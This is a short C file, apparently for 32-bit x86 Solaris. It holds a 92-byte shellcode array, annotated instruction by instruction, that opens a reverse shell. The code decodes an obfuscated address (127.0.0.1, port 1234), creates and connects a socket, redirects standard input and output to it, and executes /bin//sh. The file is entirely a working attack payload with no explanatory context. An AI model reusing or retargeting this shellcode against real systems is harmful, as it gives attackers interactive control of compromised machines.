
// Target architecture : X86 32

#define RS_SIZE 92

char RS[] = {
  /* 0000 */ "\xb8\x80\xff\xff\xfe" /* mov  eax, 0xfeffff80 */
  /* 0005 */ "\xba\xfd\xff\xfb\x2d" /* mov  edx, 0x2dfbfffd */
  /* 000A */ "\xf7\xd0"             /* not  eax             */
  /* 000C */ "\xf7\xd2"             /* not  edx             */
  /* 000E */ "\x50"                 /* push eax             */
  /* 000F */ "\x52"                 /* push edx             */
  /* 0010 */ "\x89\xe7"             /* mov  edi, esp        */
  /* 0012 */ "\x31\xdb"             /* xor  ebx, ebx        */
  /* 0014 */ "\xf7\xe3"             /* mul  ebx             */
  /* 0016 */ "\xb0\x02"             /* mov  al, 2           */
  /* 0018 */ "\x50"                 /* push eax             */
  /* 0019 */ "\x52"                 /* push edx             */
  /* 001A */ "\x52"                 /* push edx             */
  /* 001B */ "\x50"                 /* push eax             */
  /* 001C */ "\x50"                 /* push eax             */
  /* 001D */ "\x50"                 /* push eax             */
  /* 001E */ "\xb0\xe6"             /* mov  al, 0xe6        */
  /* 0020 */ "\xcd\x91"             /* int  0x91            */
  /* 0022 */ "\x93"                 /* xchg eax, ebx        */
  /* 0023 */ "\x59"                 /* pop  ecx             */
  /* 0024 */ "\x51"                 /* push ecx             */
  /* 0025 */ "\x52"                 /* push edx             */
  /* 0026 */ "\xb0\x06"             /* mov  al, 6           */
  /* 0028 */ "\xcd\x91"             /* int  0x91            */
  /* 002A */ "\x51"                 /* push ecx             */
  /* 002B */ "\x6a\x09"             /* push 9               */
  /* 002D */ "\x53"                 /* push ebx             */
  /* 002E */ "\x52"                 /* push edx             */
  /* 002F */ "\xb0\x3e"             /* mov  al, 0x3e        */
  /* 0031 */ "\xcd\x91"             /* int  0x91            */
  /* 0033 */ "\x83\xc4\x18"         /* add  esp, 0x18       */
  /* 0036 */ "\x49"                 /* dec  ecx             */
  /* 0037 */ "\x79\xeb"             /* jns  0x24            */
  /* 0039 */ "\x6a\x10"             /* push 0x10            */
  /* 003B */ "\x57"                 /* push edi             */
  /* 003C */ "\x53"                 /* push ebx             */
  /* 003D */ "\x50"                 /* push eax             */
  /* 003E */ "\xb0\xeb"             /* mov  al, 0xeb        */
  /* 0040 */ "\xcd\x91"             /* int  0x91            */
  /* 0042 */ "\x50"                 /* push eax             */
  /* 0043 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f      */
  /* 0048 */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f      */
  /* 004D */ "\x89\xe3"             /* mov  ebx, esp        */
  /* 004F */ "\x50"                 /* push eax             */
  /* 0050 */ "\x53"                 /* push ebx             */
  /* 0051 */ "\x89\xe1"             /* mov  ecx, esp        */
  /* 0053 */ "\x50"                 /* push eax             */
  /* 0054 */ "\x50"                 /* push eax             */
  /* 0055 */ "\x51"                 /* push ecx             */
  /* 0056 */ "\x53"                 /* push ebx             */
  /* 0057 */ "\x50"                 /* push eax             */
  /* 0058 */ "\xb0\x3b"             /* mov  al, 0x3b        */
  /* 005A */ "\xcd\x91"             /* int  0x91            */
};